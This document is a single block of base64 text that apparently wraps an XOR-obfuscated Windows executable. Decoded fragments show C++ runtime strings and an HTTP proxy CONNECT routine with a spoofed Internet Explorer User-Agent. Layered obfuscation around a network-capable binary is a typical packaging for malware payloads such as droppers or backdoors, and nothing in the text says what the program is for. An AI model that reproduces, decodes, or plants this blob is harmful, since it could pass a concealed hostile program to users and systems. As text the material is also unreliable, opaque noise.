eQnJqRn5aekZacmZqXnJGRFxcXF5yfnJCRnp2clZGcm5aUFxeXkJ2UnpaYlpqcmJiUlBcXk5+RlZmUmZOQnpGUl52UnZaTnpacn5+SlJ+RmpaSlJmelZ2clJaUl5aXkJeWlpSbm5icmZaZlpCclpCWFxcXF5uakpqTlpWQm52YnZ6SFxcXFxcXlJWVmZ6WmJGWlJyXlJ6QnJqVnpyZl5qQmZadkJ6Yl5qVmZaZnpWQmJaXlpaZm56Rm56Wl5yQnpqXlpaQlJ+Un52VkJmdl5WZk5SVmJWZlJyVkJ2XlJ+en5GdFxeUkJiQkZyZnJ6ZlZmfkp2Sn5OakpuVnpOUnBcXl5aXkZKSlZeRkpSSlpuSkJOYmZuTlJmSlpGXnJ6bkpCbkZiQn56ckJmRlJiWlJeRn5CalpeYnZyel5KUkJecmZ6ZnZGWkpmYlJ+TlJeVlZGalJGUkp6TmJKUl5Ofm5qamp6VlpqRnZCfk5Cfm5wXFw4j48X+pBgXYxQVB+EgFweTYhcH4xQVB/cuFweTYhcHZGNlfnlwN2N4eDd7eHlwF42Ojo6Ojh5XFxcXFxcXB1eNjo6Ojg5WV1cTFQe6WhcHZ3kXB2d5FwdneRcHZ3kXB2d5FwefExUHyloXB8cTFQcRWRcHlaMWBwSmFgcApBYHJaMWBxqnFgcnbycjJ28lJCdvJi4nbyQjJ29xcidvdCYXFxcXGh0aHRcXFxcXFxcXVFhZWVJUQzcyZC0yczdfQ0NHOCY5JxodQmRyZTpWcHJ5Yy03Wnhtfnt7djgjOSc3P3R4emd2Y351e3IsN1pEXlI3ITknLDdAfnlzeGBkN1lDNyI5Jiw3REEmPhodX3hkYy03MmQaHVZ0dHJnYy03PTg9Gh1HZXZwenYtN3l4OnR2dH9yGh1HZXhvbjpUeHl5cnRjfnh5LTdccnJnOlZ7fmFyGh1UeHljcnljOltyeXBjfy03JxodGh0XFxcLEhUHX1kXBwdBFwd1dnM3dnt7eHR2Y354eRcXcxIVB0FhFweTYhcHQnl8eXhgeTdyb3RyZ2N+eHkXFxd0ZHr3FhcXFxcXFxcXFxcXFBcXFzcShA4XFxcXFxcXFxcXFxd3exUHr3sVBz8XeRdiF3sXexc+FxcXFxc/eWJ7ez4XFxcXFxcRFxcRFxYXFwcXFBEXERUHE1JSUhISEhISIicXRxcXFxc/Ny9HTxAfFyAnJ0BHEBcXNzcfFxcXFx93f3d3d3cXF29nb29vbx8QHxcXEBcfHx8XFx8XHxcQHxcXF18XXxctF3oXehctF2QXZBcXFxcXcxdzF3MXcxc7FzcXWhdaF1oXWhc3F3MXcxc7FzcXbhduF24XbhcXF1oXWhc4F3MXcxc4F24XbhcXFxcXRxdaFxcXFxdWF1oXFxcXF1MXchd0F3IXehd1F3IXZRcXFxcXWRd4F2EXchd6F3UXchdlFxcXFxdYF3QXYxd4F3UXchdlFxcXRBdyF2cXYxdyF3oXdRdyF2UXFxdWF2IXcBdiF2QXYxcXFxcXXRdiF3sXbhcXFxcXXRdiF3kXchcXFxcXVhdnF2UXfhd7FxcXWhd2F2UXdBd/FxcXURdyF3UXZRdiF3YXZRduFxcXFxddF3YXeRdiF3YXZRduFxcXUxdyF3QXFxdZF3gXYRcXF1gXdBdjFxcXRBdyF2cXFxdWF2IXcBcXF10XYhd7FxcXXRdiF3kXFxdaF3YXbhcXF1YXZxdlFxcXWhd2F2UXFxdRF3IXdRcXF10Xdhd5FxcXRBd2F2MXYhdlF3MXdhduFxcXFxdRF2UXfhdzF3YXbhcXFxcXQxd/F2IXZRdkF3MXdhduFxcXFxdAF3IXcxd5F3IXZBdzF3YXbhcXF0MXYhdyF2QXcxd2F24XFxdaF3gXeRdzF3YXbhcXFxcXRBdiF3kXcxd2F24XFxcXF0QXdhdjFxcXURdlF34XFxdDF38XYhcXF0AXchdzFxcXQxdiF3IXFxdaF3gXeRcXF0QXYhd5FxcXX18tenotZGQXFxcXc3Nzczs3WlpaWjdzczs3bm5ubhdaWjhzczhubhcXFxdHWhcXVloXF1NydHJ6dXJlFxcXF1l4YXJ6dXJlFxcXF1h0Y3h1cmUXRHJnY3J6dXJlFxcXVmJwYmRjFxddYntuFxcXF11ieXIXFxcXVmdlfnsXFxdadmV0fxcXF1FydWVidmVuFxcXF112eWJ2ZW4XU3J0F1l4YRdYdGMXRHJnF1ZicBddYnsXXWJ5F1p2bhdWZ2UXWnZlF1FydRdddnkXRHZjYmVzdm4XFxcXUWV+c3ZuFxdDf2JlZHN2bhcXFxdAcnN5cmRzdm4XFxdDYnJkc3ZuF1p4eXN2bhcXRGJ5c3ZuFxdEdmMXUWV+F0N/YhdAcnMXQ2JyF1p4eR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gWFxcXFxfnaBYXFxcXF+doQtIaHo9e1SgECTfo6OjYqGJqwlrSQtKosEJCQkJCwihEbZGPjo7eKAsXFxcXF/eoFxcXFxcX5ygXFxcXFxfnKBcXFxcXlfgoFxcXFxeV+CgXFxcXFx/4KBcXFxcXH/goFxcXFxeF+SgXFxcXF4X5KBcXFxcXCfkoFxcXFxcJ+SgXFxcXF7n6KBcXFxcXufooFxcXFxdV+igXFxcXF1X6KBcXFxcXz/soFxcXFxfP+ygXFxcXF2X7KBcXFxcXZfsoFxcXFxcZ+ygXFxcXFxn7KBcXFxcXu/woFxcXFxe7/CgXFxcXF1n8KBcXFxcXWfwoFxcXFxfl/SgXFxcXF+X9KBcXFxcXj/0oFxcXFxeP/SgXFxcXF1X9KBcXFxcXVf0oFxcXFxf7/igXFxcXF/v+KBcXFxcXjf4oFxcXFxeN/igXFxcXF1/+KBcXFxcXX/4oFxcXFxft/ygXFxcXF+3/KBcXFxcXu/8oFxcXFxe7/ygXFxcXF3X/KBcXFxcXdf8oFxcXFxcP/ygXFxcXFw//KBcXFxcXx/AoFxcXFxfH8CgXFxcXF53wKBcXFxcXnfAoFxcXFxdR8CgXFxcXF1HwKBcXFxcXFfAoFxcXFxcV8CgXFxcXF9XxKBcXFxcX1fEoFxcXFxeV8SgXFxcXF5XxKBcXFxcXVfEoFxcXFxdV8SgXFxcXFxHxKBcXFxcXEfEoFxcXFxfd8igXFxcXF93yKBcXFxcXmfIoFxcXFxeZ8igXFxcXF0HyKBcXFxcXQfIoFxcXFxcJ8igXFxcXFwnyKBcXFxcX8fMoFxcXFxfx8ygXFxcXF6fzKBcXFxcXp/MoFxcXFxdt8ygXFxcXF23zKBcXFxcXUfMoFxcXFxdR8ygXFxcXFwPzKBcXFxcXA/MoFxcXFxf19CgXFxcXF/X0KBcXFxcXpfQoFxcXFxel9CgXFxcXF5X0KBcXFxcXlfQoFxcXFxdF9CgXFxcXF0X0KBcXFxcXM/QoFxcXFxcz9CgXFxcXF+H1KBcXFxcX4fUoFxcXFxfd9SgXFxcXF931KBcXFxcXifUoFxcXFxeJ9SgXFxcXF2P1KBcXFxcXY/UoFxcXFxdd9SgXFxcXF131KBcXFxcXN/UoFxcXFxc39SgXFxcXF+/2KBcXFxcX7/YoFxcXFxfH9igXFxcXF8f2KBcXFx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d4F2UXGhcdFxcXFxdTF1gXWhdWF14XWRc3F3IXZRdlF3gXZRcaFx0XFxcXF0UXIRcnFyQXJBcaFx0XOhc3F1YXYxdjF3IXehdnF2MXNxdjF3gXNxdiF2QXchc3F1oXRBdeF1sXNxd0F3gXcxdyFzcXcRdlF3gXehc3F2MXfxd+F2QXNxd2F2QXZBdyF3oXdRd7F24XNxdzF2IXZRd+F3kXcBc3F3kXdhdjF34XYRdyFzcXdBd4F3MXchc3F34XeRd+F2MXfhd2F3sXfhdtF3YXYxd+F3gXeRcdF0MXfxd+F2QXNxd+F3kXcxd+F3QXdhdjF3IXZBc3F3YXNxd1F2IXcBc3F34XeRc3F24XeBdiF2UXNxd2F2cXZxd7F34XdBd2F2MXfhd4F3kXORc3F14XYxc3F34XZBc3F3oXeBdkF2MXNxd7F34XfBdyF3sXbhc3F2MXfxdyFzcXZRdyF2QXYhd7F2MXNxd4F3EXNxd0F3YXexd7F34XeRdwFzcXdhd5FzcXWhdEF14XWxc6F3QXeBd6F2cXfhd7F3IXcxc3Fz8XOBd0F3sXZRc+FzcXcRdiF3kXdBdjF34XeBd5FzcXcRdlF3gXehc3F3YXNxd5F3YXYxd+F2EXchc3F3QXeBd5F2QXYxdlF2IXdBdjF3gXZRc3F3gXZRc3F3EXZRd4F3oXNxdTF3sXexdaF3YXfhd5FzkXGhcdFxcXFxdFFyEXJxckFyUXGhcdFzoXNxd5F3gXYxc3F3IXeRd4F2IXcBd/FzcXZBdnF3YXdBdyFzcXcRd4F2UXNxd7F3gXdBd2F3sXchc3F34XeRdxF3gXZRd6F3YXYxd+F3gXeRcaFx0XFxcXF0UXIRcnFyQXJhcaFx0XOhc3F1YXYxdjF3IXehdnF2MXNxdjF3gXNxd+F3kXfhdjF34Xdhd7F34XbRdyFzcXYxd/F3IXNxdUF0UXQxc3F3oXeBdlF3IXNxdjF38Xdhd5FzcXeBd5F3QXchc5Fx0XQxd/F34XZBc3F34XeRdzF34XdBd2F2MXchdkFzcXdhc3F3UXYhdwFzcXfhd5FzcXbhd4F2IXZRc3F3YXZxdnF3sXfhd0F3YXYxd+F3gXeRc5FxoXHRcXFxcXRRchFycXJBcnFxoXHRc6FzcXVBdFF0MXNxd5F3gXYxc3F34XeRd+F2MXfhd2F3sXfhdtF3IXcxcaFx0XFxcXF0UXIRcnFyUXLxcaFx0XOhc3F2IXeRd2F3UXexdyFzcXYxd4FzcXfhd5F34XYxd+F3YXexd+F20Xchc3F38Xchd2F2cXGhcdFxcXFxcXFxcXRRchFycXJRcgFxoXHRc6FzcXeRd4F2MXNxdyF3kXeBdiF3AXfxc3F2QXZxd2F3QXchc3F3EXeBdlFzcXexd4F2AXfhd4FzcXfhd5F34XYxd+F3YXexd+F20XdhdjF34XeBd5FxoXHRcXFxcXFxcXF0UXIRcnFyUXIRcaFx0XOhc3F3kXeBdjFzcXchd5F3gXYhdwF38XNxdkF2cXdhd0F3IXNxdxF3gXZRc3F2QXYxdzF34XeBc3F34XeRd+F2MXfhd2F3sXfhdtF3YXYxd+F3gXeRcaFx0XFxcXFxcXFxdFFyEXJxclFyIXGhcdFzoXNxdnF2IXZRdyFzcXYRd+F2UXYxdiF3YXexc3F3EXYhd5F3QXYxd+F3gXeRc3F3QXdhd7F3sXGhcdFxcXFxcXF0UXIRcnFyUXIxcaFx0XOhc3F3kXeBdjFzcXchd5F3gXYhdwF38XNxdkF2cXdhd0F3IXNxdxF3gXZRc3F0gXeBd5F3IXbxd+F2MXOBd2F2MXchdvF34XYxc3F2MXdhd1F3sXchcaFx0XFxcXFxcXFxdFFyEXJxcmFy4XGhcdFzoXNxdiF3kXdhd1F3sXchc3F2MXeBc3F3gXZxdyF3kXNxd0F3gXeRdkF3gXexdyFzcXcxdyF2EXfhd0F3IXGhcdFxcXFxcXFxcXRRchFycXJhcvFxoXHRc6FzcXYhd5F3IXbxdnF3IXdBdjF3IXcxc3F38Xchd2F2cXNxdyF2UXZRd4F2UXGhcdFxcXFxcXFxcXRRchFycXJhcgFxoXHRc6FzcXYhd5F3IXbxdnF3IXdBdjF3IXcxc3F3oXYhd7F2MXfhdjF38XZRdyF3YXcxc3F3sXeBd0F3wXNxdyF2UXZRd4F2UXGhcdFxcXFxcXFxcXRRchFycXJhchFxoXHRc6FzcXeRd4F2MXNxdyF3kXeBdiF3AXfxc3F2QXZxd2F3QXchc3F3EXeBdlFzcXYxd/F2UXchd2F3MXNxdzF3YXYxd2FxoXHRcXF0UXIRcnFyYXJxcaFx0XOhc3F3YXdRd4F2UXYxc/Fz4XNxd/F3YXZBc3F3UXchdyF3kXNxd0F3YXexd7F3IXcxcaFx0XFxcXF0UXIRcnFycXLhcaFx0XOhc3F3kXeBdjFzcXchd5F3gXYhdwF38XNxdkF2cXdhd0F3IXNxdxF3gXZRc3F3IXeRdhF34XZRd4F3kXehdyF3kXYxcaFx0XFxdFFyEXJxcnFy8XGhcdFzoXNxd5F3gXYxc3F3IXeRd4F2IXcBd/FzcXZBdnF3YXdBdyFzcXcRd4F2UXNxd2F2UXcBdiF3oXchd5F2MXZBcaFx0XFxcXFxcXRRchFycXJxclFxoXHRc6FzcXcRd7F3gXdhdjF34XeRdwFzcXZxd4F34XeRdjFzcXZBdiF2cXZxd4F2UXYxc3F3kXeBdjFzcXexd4F3YXcxdyF3MXGhcdFxcXFxcXFxcXFRcXF0/5FgcfFxcXF/kWBx4XFxe/+hYHHRcXF3f6FgcHFxcXH/oWBwYXFxe/+xYHBRcXF3f7FgcEFxcXH/sWBw8XFxeP/BYHDhcXF1/8FgcNFxcXz/0WBwwXFxd//RYHCxcXFw/9FgcJFxcXz/4WBwgXFxcH/hYHNxcXF7//Fgc2FxcXr/EWB28XFxeP8RYHbhcXF2vxFgdtFxcXd/EWB+sXFxdP8RYH6BcXFy/xFgdaF34XdBdlF3gXZBd4F3EXYxc3F0EXfhdkF2IXdhd7FzcXVBc8FzwXNxdFF2IXeRdjF34XehdyFzcXWxd+F3UXZRd2F2UXbhcXFxcXHRcdFxcXFxc5FzkXORcXFysXZxdlF3gXcBdlF3YXehc3F3kXdhd6F3IXNxdiF3kXfBd5F3gXYBd5FykXFxcXF0UXYhd5F2MXfhd6F3IXNxdSF2UXZRd4F2UXNhcdFx0XRxdlF3gXcBdlF3YXehctFzcXFxc3VHh6Z3tyY3I3WHV9cnRjN1t4dHZjeGUwFxcXN1R7dmRkN19+cmV2ZXR/bjdTcmR0ZX5nY3hlMBcXFxc3VXZkcjdUe3ZkZDdWZWV2bjAXFzdVdmRyN1R7dmRkN1NyZHRlfmdjeGU3dmM3Pxc3Q25ncjdTcmR0ZX5nY3hlMBcXF3d7eHR2ezdkY3ZjfnQ3Y39lcnZzN3BidmVzMBd3enZ5dnByczdhcnRjeGU3dHhnbjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXF3dhcnRjeGU3YXV2ZHI3dHhnbjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXd2FydGN4ZTd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXd3NueXZ6fnQ3dmNyb35jN3NyZGNlYnRjeGU3cXhlNzAXFxcXd3NueXZ6fnQ3fnl+Y352e35tcmU3cXhlNzAXF3dyfzdhcnRjeGU3YXV2ZHI3dHhnbjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXd3J/N2FydGN4ZTd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXF3d6dnl2cHJzN2FydGN4ZTdzcmRjZWJ0Y3hlN35jcmV2Y3hlMBcXFxd3enZ5dnByczdhcnRjeGU3dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxcXd2d7dnRyenJ5YzdzcntyY3JMSjd0e3hkYmVyMBcXFxd3Z3t2dHJ6cnljN3Nye3Jjcjd0e3hkYmVyMBcXd3h6eX43dHZ7e2R+cDAXFzdzcntyY3JMShcXFzd5cmBMShcXd3t4dHZ7N2FxY3Z1e3I3dHh5ZGNlYnRjeGU3dHt4ZGJlcjAXd3t4dHZ7N2FxY3Z1e3IwF3dFQ0NeFxcXd1JfF3dic2M3ZXJjYmV5fnlwMBd3dHhnbjd0eHlkY2VidGN4ZTd0e3hkYmVyMBcXd3J/N2FydGN4ZTdhdXZkcjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXF3dyfzdhcnRjeGU3c3JkY2VidGN4ZTd+Y3JldmN4ZTAXd3J/N2FydGN4ZTd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXd2F+ZWNidns3c35kZ3t2dHJ6cnljN3p2ZzAXF3dhcnRjeGU3YXV2ZHI3dHh5ZGNlYnRjeGU3fmNyZXZjeGUwF3dhcnRjeGU3c3JkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXd2FydGN4ZTd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxd3ZHR2e3ZlN3Nye3JjfnlwN3NyZGNlYnRjeGUwFxcXF3dzcnF2YntjN3R4eWRjZWJ0Y3hlN3R7eGRiZXIwFxcXd2FydGN4ZTdzcntyY355cDdzcmRjZWJ0Y3hlMBcXFxd3YXV2ZHI3c3JkY2VidGN4ZTAXF3dkY2V+eXAwFxcXF3d7eHR2ezdkY3ZjfnQ3cGJ2ZXMwFxcXF3djbmdyeHEwFxcXF3dhdHZ7ezAXd2F1Y3Z1e3IwFxcXd2FxY3Z1e3IwFxcXSSoXF2sqFxcxKhcXKysqFykpKhcyKhcXOCoXFzoqFxc8KhcXPSoXF2trFxcxMRcXaxcXF0kXFxdpFxcXPz4XFzsXFxcpKhcXKRcXFysqFxcrFxcXMhcXFzgXFxc6KT0XMRcXFzwXFxc6FxcXOjoXFzw8Fxc9FxcXOikXF3hncmV2Y3hlFxcXF0xKFxc2KhcXKioXFzYXFxcrKxcXKSkXFzdzcntyY3IXN3lyYBcXFxdISGJ5dnt+cHlycxdISGVyZGNlfnRjFxdISGdjZSEjF0hIcnZ1fhcXSEh0e2V0dnt7FxcXSEhxdmRjdHZ7excXSEhjf35kdHZ7excXSEhkY3N0dnt7FxcXSEhndmR0dnsXFxcXSEh0c3J0exdISHV2ZHJzPxcXFxer4hYHo+IWB7/iFgeL4hYHh+IWB5PiFgdv4hYHZ+IWB3/iFgdL4hYHR+IWB0jUFgdf4hYHV+IWB9/CFgcr4hYHL+IWByPiFgcn4hYHO+IWBz/iFgcL4hYHD+IWBwPiFgcH4hYHG+IWBx/iFgcT4hYHF+IWB+vjFgfv4xYH4+MWB+fjFgf74xYH/+MWB/PjFgf34xYHy+MWB8/jFgfD4xYHx+MWB9vjFgff4xYH0+MWB9fjFger4xYHr+MWB6PjFgen4xYHu+MWB7/jFgez4xYHt+MWB4PjFgef4xYHl+MWB2PjFgdL4xYHR+MWByvjFgcL4xYH6+QWB8vkFger5BYHi+QWB2/kFgdL5BYHL+QWBw/kFgfn5RYHw+UWB9PlFgfX5RYHr+UWB7/lFgeT5RYHa+UWB2flFgd35RYHU+UWBzPlFgfr5hYHw+YWB7vmFgeX5hYHc+YWB1fmFgcL5hYH5+cWB9PnFge/5xYHSNQWB4PnFgdv5xYHc+cWB1PnFgc/5xYHFxcXFxGXl5GXlpcXFwcUkZeRlZcDEhJSUlKSkpISFxcnJ5dHl58XHxc/MC9HQJcXEBcgJydHR58XFxc3P5efl5cXFxd3f3d/f38fHxBvZ2dgZ2cfHxcXHxcfFxAfFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxc3FzcXNxc3FzcXNxc3FzcXNxc/Fz8XPxc/Fz8XNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXXxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxeTF5MXkxeTF5MXkxeTF5MXkxeTFwcXBxcHFwcXBxcHFwcXlheWF5YXlheWF5YXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFwcXBxcHFwcXBxcHF5UXlReVF5UXlReVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcHFwcXBxcHFzcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXNxc3FzcXNxc3FzcXNxc3FzcXfxc/Fz8XPxc/FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3F18XBxcHFwcXBxcHFwcXBxcHFwcX